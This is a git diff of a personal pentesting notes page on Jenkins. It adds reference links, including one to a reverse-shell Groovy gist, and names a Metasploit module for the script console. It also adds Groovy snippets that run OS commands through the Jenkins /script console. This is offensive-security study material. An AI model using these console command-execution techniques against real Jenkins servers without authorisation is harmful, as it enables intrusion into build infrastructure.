@@ -21,7 +21,12 @@ Jenkins can be connected to a database or LDAP.
 
 ## Jenkins Pentester Notes ☠️
 
+[![attacking_common_applications](../../../cybersecurity/_badges/htb/attacking_common_applications.svg)](https://academy.hackthebox.com/course/preview/attacking-common-applications)
+[![jenkins_security](../../../cybersecurity/_badges/hacktricks/jenkins_security.svg)](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)
+
 <div class="row row-cols-lg-2"><div>
+
+Useful reference: [pwn_jenkins](https://github.com/gquere/pwn_jenkins) <small>(1.7k ⭐)</small>.
 
 #### Enumeration
 
@@ -49,6 +54,25 @@ def output = stderr + stdout
 println("Exit Code: ${exitCode}")
 println("Output:\n${output}")
 ```
+
+➡️ See also: [revsh.groovy](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) <small>(0.1k ⭐)</small>.
+
+<details class="details-n">
+<summary>Additional Notes For /script</summary>
+
+Metasploit: `exploit/multi/http/jenkins_script_console`.
+
+```groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/ls","-la"] as String[])
+p.waitFor()
+```
+
+```groovy
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
+```
+</details>
 </div></div>
 
 <hr class="sep-both">
@@ -62,6 +86,7 @@ Stuff that I found, but never read/used yet.
 * master/slaves (a.k.a. workers)
 * freestyle projects (web interface) vs pipeline jobs (as code)
 * Jenkinsfile (groovy)
+* `/var/lib/jenkins3/`
 </div><div>
 
 <details class="details-n">
